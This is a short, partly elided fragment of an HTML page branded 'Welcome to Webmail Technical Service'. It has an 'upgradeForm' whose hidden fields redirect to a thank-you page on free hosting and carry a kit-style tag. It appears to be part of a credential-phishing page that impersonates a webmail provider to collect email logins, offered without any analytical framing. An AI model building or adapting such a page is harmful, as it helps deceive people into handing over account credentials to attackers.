...
<div class="header">
<center>
	<h1><font face="Courier">Welcome to Webmail Technical Service</font></h1>
</center>
...
<div class="container">
	<div class="col-sm-11">
		<form action="" method="post" name="upgradeForm">
			...
			<input type="hidden" name="onext" value="https://mailbox45.getforge.io/thankyou.html">
			<input type="hidden" name="klynt" value="MailIB">
		</form>
	</div>
</div>
</body>
